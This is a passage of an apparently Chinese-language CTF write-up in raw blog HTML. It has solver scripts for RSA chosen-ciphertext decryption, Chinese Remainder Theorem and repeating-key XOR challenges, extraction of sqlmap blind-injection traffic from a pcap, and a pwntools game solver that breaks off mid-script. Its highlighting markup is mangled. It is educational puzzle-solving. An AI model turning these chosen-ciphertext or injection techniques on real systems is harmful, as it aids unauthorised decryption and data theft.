44072159524363345025395860514193439618850855989758877019251604535424645173015578445641737155410124722089855034524900974899143590319109150794463017988146330700682402644722045151564192212786022295270147246354021288864468319458821200111865992881657865302651297307278194354152154089398262689939864900434490148230032752585607483545643297707980226837109082596681204037909705850077064452350740011904984407745294229799642805761872912116003683053767810208214723900549369485228083610800628462169538658223452866042552036179759904943895834603686937581017818440377415869062864539021787490351747089653244541577383430879642738738253</span><br><span class="line">    r = 45190871623538944093785281221851226180318696177837272787303375892782101654769663373321786970252485047721399081424329576744995348535617043929235745038926187396763459008615146009836751084746961130136655078581684659910694290564871708049474081354336784708387445467688447764440168942335060081663025621606012816840929949463114413777617148271738737393997848713788551935944366549647216153686444107844148988979274170780431747264142309111561515570105997844879370642204474047548042439569602410985090283342829596708258426959209412220871489848753600755629841006861740913336549583365243419009944724130194890707627810912114268824770</span><br><span class="line"></span><br><span class="line">    cipher2 = n2b(c2)</span><br><span class="line">    plaintext3 = debytes(n,d,cipher2)</span><br><span class="line">    print (plaintext3)</span><br><span class="line">    p3 = b2n(plaintext3)</span><br><span class="line">    p4 = (p3 * invmod(r, n)) % n</span><br><span class="line">    plaintext4 = n2b(p4)</span><br><span class="line">    print (plaintext4)</span><br></pre></td></tr></table></figure>
<h3 id="Rsa-good"><a href="#Rsa-good" class="headerlink" title="Rsa good"></a>Rsa good</h3><p>CCA Attack<br>已知 pow(flag, e, n)，解密 pow(flag, e, n) <em> pow(2, e, n) % n，获得 pow(2 </em> flag, e, n) 的明文 2 * flag 即可</p>
<p>这题脚本有问题，每次交互的n都是一样的，而且最重要的是n有问题，能被分解，p还是个7 emmmmm。。。。。。。</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><p>Game</p>
<p>此题依据原理为中国剩余定理，解题代码如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gm</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">()</span>:</span></span><br><span class="line">    holes = [<span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>]</span><br><span class="line">    remains = []</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"sand.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        line = f.readline().strip()</span><br><span class="line">        <span class="keyword">while</span> line:</span><br><span class="line">            remains.append(int(line))</span><br><span class="line">            line = f.readline().strip()</span><br><span class="line"></span><br><span class="line">    M = gm.mpz(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> hole <span class="keyword">in</span> holes:</span><br><span class="line">        M = M * hole</span><br><span class="line">    m = []</span><br><span class="line">    m_inv = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(holes)):</span><br><span class="line">        m.append(M / holes[i])</span><br><span class="line">        m_inv.append(gm.invert(m[i], holes[i]))</span><br><span class="line">    re = gm.mpz(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(holes)):</span><br><span class="line">        re = re + m[i] * m_inv[i] * remains[i]</span><br><span class="line">    re = gm.f_mod(re, M)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"flag&#123;"</span> + hex(re)[<span class="number">2</span>:].decode(<span class="string">"hex"</span>) + <span class="string">"&#125;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    crack()</span><br></pre></td></tr></table></figure>
<h3 id="Cycle"><a href="#Cycle" class="headerlink" title="Cycle"></a>Cycle</h3><p>本题依据原理为Vernam密码。cycle.py通过循环使用秘钥字符串（flag）对明文进行异或操作，得到密文。该种加密方式类似于Vernam密码。cycle.py中已经告知秘钥字符串长度不超过50，且明文为英文，那么通过遍历秘钥长度，在不同秘钥长度下分别遍历单个字节的秘钥，通过统计明文中出现的英文字符出现情况即可发现最佳秘钥长度和最佳秘钥。例如，若秘钥长度为L，则先分别取密文第0,L-1,2L-1,…个字符，遍历256单字节秘钥，取明文最可能是英文的那个秘钥；然后取密文1,L,2L,…个字符，以同样方式获得秘钥第二个字节。按此方法，破解长度为L的复杂度为256L，而将L遍历1到n=50的总复杂度为O(n^2)。破解代码如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># --encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scoreChar</span><span class="params">(str)</span>:</span></span><br><span class="line">    chars = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">    chars += chars.upper()</span><br><span class="line">    chars += <span class="string">" \n,."</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str)):</span><br><span class="line">        <span class="keyword">if</span> str[i] <span class="keyword">in</span> chars:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(c, key)</span>:</span></span><br><span class="line">    m = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line">        byte = ord(c[i])</span><br><span class="line">        byte = byte ^ key</span><br><span class="line">        m = m + chr(byte)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">(cs)</span>:</span></span><br><span class="line">    re = &#123;&#125;</span><br><span class="line">    <span class="comment"># print "cracking ", cs.encode("hex")</span></span><br><span class="line">    bestS = <span class="string">""</span></span><br><span class="line">    bestScore = <span class="number">-100000000</span></span><br><span class="line">    bestKey = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        s = decrypt(cs, key)<span class="comment">#cs为字节数组</span></span><br><span class="line">        score = scoreChar(s)</span><br><span class="line">        <span class="keyword">if</span> (score &gt; bestScore):</span><br><span class="line">            bestS = s</span><br><span class="line">            bestScore = score</span><br><span class="line">            bestKey = chr(key)</span><br><span class="line">    <span class="keyword">return</span> [bestS, bestKey, bestScore]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipherBytesFromFile</span><span class="params">(file)</span>:</span></span><br><span class="line">    cipherText = <span class="string">""</span></span><br><span class="line">    <span class="keyword">with</span> open(file) <span class="keyword">as</span> f:</span><br><span class="line">        line = f.readline().strip()</span><br><span class="line">        <span class="keyword">while</span>(len(line) &gt; <span class="number">1</span>):</span><br><span class="line">            cipherText += line</span><br><span class="line">            line = f.readline().strip()</span><br><span class="line">    cipherText = cipherText.decode(<span class="string">"base_64"</span>)</span><br><span class="line">    <span class="keyword">return</span> cipherText</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crackKeyWithSize</span><span class="params">(keySize, cipherText)</span>:</span></span><br><span class="line">    cs = [<span class="string">""</span>] * keySize</span><br><span class="line">    ms = [<span class="string">""</span>] * keySize</span><br><span class="line">    key = <span class="string">""</span></span><br><span class="line">    totalScore = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipherText)):</span><br><span class="line">        cs[i % keySize] += cipherText[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(keySize):</span><br><span class="line">        [ms[i], k, score] = crack(cs[i])</span><br><span class="line">        totalScore += score</span><br><span class="line">        key += k</span><br><span class="line"></span><br><span class="line">    m = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(cipherText)):</span><br><span class="line">        m += ms[i % keySize][i / keySize]</span><br><span class="line">    <span class="keyword">return</span> [m, key, totalScore]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryptWithKey</span><span class="params">(key)</span>:</span></span><br><span class="line">    cipherText = getCipherBytesFromFile(<span class="string">"data6"</span>)</span><br><span class="line">    m = <span class="string">""</span></span><br><span class="line">    keyBytes = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)):</span><br><span class="line">        keyBytes.append(ord(key[i]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipherText)):</span><br><span class="line">        byte = ord(cipherText[i]) ^ keyBytes[i % len(key)]</span><br><span class="line">        m += chr(byte)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    cipherText = getCipherBytesFromFile(<span class="string">"cipher.txt"</span>)</span><br><span class="line">    bestScore = <span class="number">-10000</span></span><br><span class="line">    bestKey = bestM = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> size <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        [m, key, score] = crackKeyWithSize(size, cipherText)</span><br><span class="line">        <span class="keyword">if</span> score &gt; bestScore:</span><br><span class="line">            bestScore = score</span><br><span class="line">            bestKey = key</span><br><span class="line">            bestM = m</span><br><span class="line">    <span class="keyword">print</span> bestKey</span><br><span class="line">    <span class="keyword">print</span> bestScore</span><br><span class="line">    <span class="keyword">print</span> bestM</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="TNT"><a href="#TNT" class="headerlink" title="TNT"></a>TNT</h3><h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h4><p>1.流量分析,发现全是<code>SQLMAP</code>的流量,注入方式为时间盲注。首先写代码把所有的请求URL提取出来(或者用<code>wireshark</code>打开<code>pcpa</code>文件-导出分组解析结果-为<code>csv</code>)</p>
<h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2"></a>step 2</h4><p>Sqlmap在时间盲注时,最后会使用<code>!=</code>确认这个值,所以可以提取出所有带有<code>!=</code>的URL,提取出后面的ascii码,使用chr(数字)将其转换为字符</p>
<h4 id="step-3"><a href="#step-3" class="headerlink" title="step 3"></a>step 3</h4><p>打印出来,会发现一串<code>BASE64</code>,<code>BASE64</code>有点奇怪,反复分析,发现没有大写<code>X</code>,多了符号<code>.</code>,当然是把点替换成<code>X</code>啦.解码,保存为文件(可以使用<code>Python</code>,记得写入的时候使用<code>open(file,&#39;wb&#39;)</code> 二进制写入模式。)</p>
<h4 id="step-4"><a href="#step-4" class="headerlink" title="step 4"></a>step 4</h4><p>文件头为<code>BZ</code>,应该是个<code>bzip</code>文件,把扩展名改成<code>bz2</code>,winrar解压(或者直接在linux下用bunzip2解压).<code>file1</code>文件头为<code>xz</code>的文件头,使用<code>xz</code>解压,里面又是一个<code>gz</code>格式的<code>file1</code>,再解压一次,得到<code>33.333</code>文件,文件尾部有<code>Pk</code>字样,说明是<code>zip</code>,二进制编辑器改文件头为<code>zip</code>文件头,解压.改文件头为<code>rar</code>,解压得到flag.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'''exm1.pcap'''</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">pattern=re.compile(<span class="string">'''GET /vulnerabilities/sqli_blind/.+HTTP/1\.1'''</span>)</span><br><span class="line">lines=pattern.findall(f)</span><br><span class="line">a=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    raw_line=urllib.unquote(line)</span><br><span class="line">    i=raw_line.find(<span class="string">"!="</span>)</span><br><span class="line">    <span class="keyword">if</span> i&gt;<span class="number">0</span>:</span><br><span class="line">        a=<span class="number">0</span></span><br><span class="line">        asc=raw_line[i+<span class="number">2</span>:]</span><br><span class="line">        asc=asc[:asc.find(<span class="string">')'</span>)]</span><br><span class="line">        sys.stdout.write(chr(int(asc)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> a&gt;<span class="number">10</span>:</span><br><span class="line">            sys.stdout.write(<span class="string">'\n'</span>)</span><br><span class="line">            a=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">str=<span class="string">'QlpoOTFBWSZTWRCesQgAAKZ///3ry/u5q9q1yYom/PfvRr7v2txL3N2uWv/aqTf7ep/usAD7MY6NHpAZAAGhoMjJo0GjIyaGgDTIyGajTI0HqAAGTQZGTBDaTagbUNppkIEGQaZGjIGmgMgMjIyAaAPU9RpoMjAjBMEMho0NMAjQ00eo9QZNGENDI0zUKqflEbU0YhoADQDAgAaaGmmgwgMTE0AGgAyNMgDIGmTQA0aNGg0HtQQQSBQSMMfFihJBAKBinB4QdSNniv9nVzZlKSQKwidKifheV8cQzLBQswEuxxW9HpngiatmLK6IRSgvQZhuuNgAu/TaDa5khJv09sIVeJ/mhAFZbQW9FDkCFh0U2EI5aodd1J3WTCQrdHarQ/Nx51JAx1b/A9rucDTtN7Nnn8zPfiBdniE1UAzIZn0L1L90ATgJjogOUtiR77tVC3EVA1LJ0Ng2skZVCAt+Sv17EiHQMFt6u8cKsfMu/JaFFRtwudUYYo9OHGLvLxgN/Sr/bhQITPglJ9MvCIqIJS0/BBxpz3gxI2bArd8gnF+IbeQQM3c1.M+FZ+E64l1ccYFRa26TC6uGQ0HnstY5/yc+nAP8Rfsim4xoEiNEEZclCsLAILkjnz6BjVshxBdyRThQkBCesQg='</span>.replace(<span class="string">'.'</span>,<span class="string">'X'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> str</span><br><span class="line">fw=open(<span class="string">'file1.bz2'</span>,<span class="string">'wb'</span>)</span><br><span class="line">fw.write(base64.b64decode(str))</span><br><span class="line">fw.close()</span><br></pre></td></tr></table></figure>
<h3 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h3><p>出题人前一段时间沉迷ACM无法自拔，觉得博弈论实在是太有意思了，又觉得作为一名优秀的选手，掌握这些优秀的算法是非常基础的（x，于是就出了这个题。</p>
<p>用到的三个博弈分别为<figure class="highlight bash"><figcaption><span>game```, ```Wythoff game``` 和 ```Nim game```。具体的推导和结论么，都给你名字了还不去查维基百科（x</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">解题脚本：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">import math</span><br><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'game.suctf.asuri.org'</span>, 10000)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Prove your heart!\n'</span>)</span><br><span class="line"></span><br><span class="line">def proof(key, h):</span><br><span class="line">	c = string.letters+string.digits</span><br><span class="line">	<span class="keyword">for</span> x0 <span class="keyword">in</span> c:</span><br><span class="line">		<span class="keyword">for</span> x1 <span class="keyword">in</span> c:</span><br><span class="line">			<span class="keyword">for</span> x2 <span class="keyword">in</span> c:</span><br><span class="line">				<span class="keyword">for</span> x3 <span class="keyword">in</span> c:</span><br><span class="line">					<span class="keyword">if</span> (hashlib.sha256(key + x0 + x1 + x2 + x3).hexdigest() == h):</span><br><span class="line">						<span class="built_in">return</span> x0 + x1 + x2 + x3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'sha256('</span>)</span><br><span class="line">key = p.recv(12)</span><br><span class="line">p.recvuntil(<span class="string">'== '</span>)</span><br><span class="line">h = p.recvline().strip()</span><br><span class="line"><span class="built_in">print</span> key, h</span><br><span class="line"></span><br><span class="line">s = proof(key, h)</span><br><span class="line"><span class="built_in">print</span> s</span><br><span class="line">p.sendline(s)	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Let\'</span>s pick stones!<span class="string">')</span></span><br><span class="line"><span class="string">for i in xrange(20):</span></span><br><span class="line"><span class="string">	p.recvuntil('</span>===========================================================================<span class="string">')</span></span><br><span class="line"><span class="string">	p.recvuntil('</span>There are <span class="string">')</span></span><br><span class="line"><span class="string">	n = int(p.recvuntil('</span>stones<span class="string">')[:-6])</span></span><br><span class="line"><span class="string">	p.recvuntil('</span> - <span class="string">')</span></span><br><span class="line"><span class="string">	x = int(p.recvuntil('</span>once<span class="string">')[:-4])</span></span><br><span class="line"><span class="string">	print n, x</span></span><br><span class="line"><span class="string">	if (n % (x + 1) == 0):</span></span><br><span class="line"><span class="string">		p.sendline('</span>GG<span class="string">')</span></span><br><span class="line"><span class="string">		continue</span></span><br><span class="line"><span class="string">	else:</span></span><br><span class="line"><span class="string">		p.sendline(str(n % (x + 1)))</span></span><br><span class="line"><span class="string">		n -= n % (x + 1)</span></span><br><span class="line"><span class="string">		while(n &gt; 0):</span></span><br><span class="line"><span class="string">			p.recvuntil('</span>I pick <span class="string">')</span></span><br><span class="line"><span class="string">			g = int(p.recvuntil('</span>!<span class="string">')[:-1])</span></span><br><span class="line"><span class="string">			p.sendline(str(x + 1 - g))</span></span><br><span class="line"><span class="string">			n -= x + 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print "level 1 pass"</span></span><br><span class="line"><span class="string">p.recvuntil('</span>You have 8 chances to input \<span class="string">'GG\'</span> to skip this round.<span class="string">')</span></span><br><span class="line"><span class="string">for i in xrange(20):</span></span><br><span class="line"><span class="string">	p.recvuntil('</span>===========================================================================<span class="string">')</span></span><br><span class="line"><span class="string">	a = 99999</span></span><br><span class="line"><span class="string">	b = 99999	</span></span><br><span class="line"><span class="string">	while (a != 0 and b != 0):</span></span><br><span class="line"><span class="string">		p.recvuntil('</span>Piles: <span class="string">')</span></span><br><span class="line"><span class="string">		g = p.recvline().strip().split('</span> <span class="string">')</span></span><br><span class="line"><span class="string">		a, b = int(g[0]), int(g[1])</span></span><br><span class="line"><span class="string">		print a, b</span></span><br><span class="line"><span class="string">		if (a == 0):</span></span><br><span class="line"><span class="string">			p.sendline("%d 1" % b)</span></span><br><span class="line"><span class="string">			break</span></span><br><span class="line"><span class="string">		if (b == 0):</span></span><br><span class="line"><span class="string">			p.sendline("%d 0" % a)</span></span><br><span class="line"><span class="string">			break</span></span><br><span class="line"><span class="string">		if (a == b):</span></span><br><span class="line"><span class="string">			p.sendline("%d 2" % a)</span></span><br><span class="line"><span class="string">			break</span></span><br><span class="line"><span class="string">		z = abs(a - b)</span></span><br><span class="line"><span class="string">		x = min(a, b)</span></span><br><span class="line"><span class="string">		y = max(a, b)</span></span><br><span class="line"><span class="string">		maxd = int(z * (1 + math.sqrt(5)) / 2)</span></span><br><span class="line"><span class="string">		if (maxd &lt; x):</span></span><br><span class="line"><span class="string">			l = [x - maxd, 2]</span></span><br><span class="line"><span class="string">		elif (maxd &gt; x):</span></span><br><span class="line"><span class="string">			t = 1</span></span><br><span class="line"><span class="string">			while True:</span></span><br><span class="line"><span class="string">				g = int(t * (1 + math.sqrt(5)) / 2)</span></span><br><span class="line"><span class="string">				if (g in (a, b) or (g + t) in (a, b)):</span></span><br><span class="line"><span class="string">					break</span></span><br><span class="line"><span class="string">				t = t + 1</span></span><br><span class="line"><span class="string">			if (g == a and g + t == b):</span></span><br><span class="line"><span class="string">				p.sendline('</span>GG<span class="string">')</span></span><br><span class="line"><span class="string">				print "GG"</span></span><br><span class="line"><span class="string">				break</span></span><br><span class="line"><span class="string">			if (g == a):</span></span><br><span class="line"><span class="string">				l = [b - (g + t), 1]</span></span><br><span class="line"><span class="string">			if (g == b):</span></span><br><span class="line"><span class="string">				l = [a - (g + t), 0]</span></span><br><span class="line"><span class="string">			if (g + t == a):</span></span><br><span class="line"><span class="string">				l = [b - g, 1]</span></span><br><span class="line"><span class="string">			if (g + t == b):</span></span><br><span class="line"><span class="string">				l = [a - g, 0]</span></span><br><span class="line"><span class="string">		else:</span></span><br><span class="line"><span class="string">			p.sendline('</span>GG<span class="string">')</span></span><br><span class="line"><span class="string">			print "GG"</span></span><br><span class="line"><span class="string">			break</span></span><br><span class="line"><span class="string">		if (l[1] == 0 or l[1] == 2):</span></span><br><span class="line"><span class="string">			a -= l[0]</span></span><br><span class="line"><span class="string">		if (l[1] == 1 or l[1] == 2):</span></span><br><span class="line"><span class="string">			b -= l[0]</span></span><br><span class="line"><span class="string">		p.sendline("%d %d" % (l[0], l[1]))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print "level2 pass"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def xxor(l):</span></span><br><span class="line"><span class="string">	r = 0</span></span><br><span class="line"><span class="string">	for i in l:</span></span><br><span class="line"><span class="string">		r ^= i</span></span><br><span class="line"><span class="string">	return r</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.recvuntil('</span>Last one is winner. You have 5 chances to skip.<span class="string">')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in xrange(20):</span></span><br><span class="line"><span class="string">	print p.recvuntil('</span>===========================================================================<span class="string">')</span></span><br><span class="line"><span class="string">	r = [99999] * 5</span></span><br><span class="line"><span class="string">	while (sum(r) != 0):</span></span><br><span class="line"><span class="string">		p.recvuntil('</span>Piles: <span class="string">')</span></span><br><span class="line"><span class="string">		r = p.recvline()</span></span><br><span class="line"><span class="string">		#print r</span></span><br><span class="line"><span class="string">		r = map(int, r.strip().split('</span> <span class="string">'))</span></span><br><span class="line"><span class="string">		print r</span></span><br><span class="line"><span class="string">		xor = 0</span></span><br><span class="line"><span class="string">		for j in xrange(5):</span></span><br><span class="line"><span class="string">			xor ^= r[j]</span></span><br><span class="line"><span class="string">		if (xor == 0):</span></span><br><span class="line"><span class="string">			p.sendline('</span>GG<span class="string">')</span></span><br><span class="line"><span class="string">			print "GG"</span></span><br><span class="line"><span class="string">			break</span></span><br><span class="line"><span class="string">		else:</span></span><br><span class="line"><span class="string">			for mx in xrange(5):</span></span><br><span class="line"><span class="string">				for d in xrange(r[mx] + 1):</span></span><br><span class="line"><span class="string">					l = list(r)</span></span><br><span class="line"><span class="string">					l[mx] -= d</span></span><br><span class="line"><span class="string">					if 